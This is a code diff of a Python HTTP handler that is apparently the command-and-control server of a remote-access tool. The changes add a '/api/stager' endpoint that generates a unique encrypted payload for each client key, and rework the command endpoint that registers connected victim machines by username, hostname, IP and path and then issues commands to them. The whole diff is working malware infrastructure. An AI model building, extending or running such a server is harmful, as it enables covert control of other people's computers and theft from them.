@@ -16,13 +16,16 @@ import base64
 import json
 import time
 import shutil
+from payload_factory import PayloadFactory
 
 
 class ClientController(BaseHTTPRequestHandler):
     """This class handles HTTPS requests and responses."""
     _model = None
-    _modules = None
     _output_view = None
+    _module_factory = None
+    _loader_factory = None
+    _payload_factory = None
 
     def send_headers(self):
         self.send_response(200)
@@ -33,13 +36,32 @@ class ClientController(BaseHTTPRequestHandler):
         """Handles POST requests."""
         data = str(self.rfile.read(int(self.headers.getheader("Content-Length"))))
 
-        if self.path == "/api/get_command":
+        if self.path == "/api/stager":
+            # Send back a unique encrypted payload.
+            client_key = data.split("&")[0].split("=")[1]
+            payload_options = json.loads(
+                base64.b64decode(unquote_plus(data).split("&")[1].replace("Cookie=session=", "", 1))
+            )
+            loader_options = payload_options["loader_options"]
+
+            self._output_view.add(
+                "[%s] Creating payload using key: %s" % (payload_options["loader_name"], client_key), "info"
+            )
+
+            if not self._payload_factory:
+                self._payload_factory = PayloadFactory(self._loader_factory)
+
+            self.wfile.write(self._payload_factory.create_payload(
+                payload_options, loader_options, client_key
+            ))
+        elif self.path == "/api/get_command":
             # Command requests
             username = data.split("&")[0].replace("username=", "", 1)
-            path = unquote_plus(data.split("&")[1].replace("path=", "", 1))
-            hostname = data.split("&")[2].replace("hostname=", "", 1)
+            hostname = data.split("&")[1].replace("hostname=", "", 1)
+            loader_name = data.split("&")[2].replace("loader=", "", 1)
             client_id = data.split("&")[3].replace("client_id=", "", 1)
-            remote_ip = data.split("&")[4].replace("remote_ip=", "", 1)
+            path = unquote_plus(data.split("&")[4].replace("path=", "", 1))
+            remote_ip = unquote_plus(data.split("&")[5].replace("remote_ip=", "", 1))
 
             client = self._model.get_client(client_id)
 
@@ -48,7 +70,11 @@ class ClientController(BaseHTTPRequestHandler):
                 self._output_view.add(self._output_view.SEPARATOR)
                 self._output_view.add("New client \"%s@%s\" connected!" % (username, hostname), "info")
 
-                self._model.add_client(Client(client_id, username, hostname, remote_ip, path, time.time()))
+                self._model.add_client(Client(
+                    client_id, username, hostname, remote_ip,
+                    path, time.time(), loader_name
+                ))
+
                 self.send_headers()
                 self.wfile.write("You dun goofed.")
             else:
@@ -101,7 +127,7 @@ class ClientController(BaseHTTPRequestHandler):
 
             if module_name:
                 # Send the response back to the module
-                for name, module_imp in self._modules.get_modules().iteritems():
+                for name, module_imp in self._module_factory.get_modules().iteritems():
                     if name == module_name:
                         try:
                             module_imp.process_response(self._output_view, response)
